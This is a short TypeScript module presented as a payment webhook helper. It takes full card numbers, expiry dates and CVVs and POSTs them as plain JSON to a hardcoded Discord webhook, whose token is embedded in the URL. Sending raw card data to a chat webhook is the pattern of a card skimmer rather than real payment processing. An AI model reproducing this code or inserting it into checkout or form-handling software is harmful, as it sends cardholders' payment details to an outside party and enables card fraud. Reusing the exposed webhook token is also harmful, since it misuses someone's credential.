export interface PaymentData {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
}

export async function sendPaymentWebhook(data: PaymentData): Promise<Response> {
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1294398707999051797/URvT3b6ixl9S9Qk6qlfdzgSN1QqEKhRKE0I79eOP0LGdVvwBPiPUTm1PDDt1Ia1_AvAr'; // Replace with your webhook URL
  
  return fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  });
}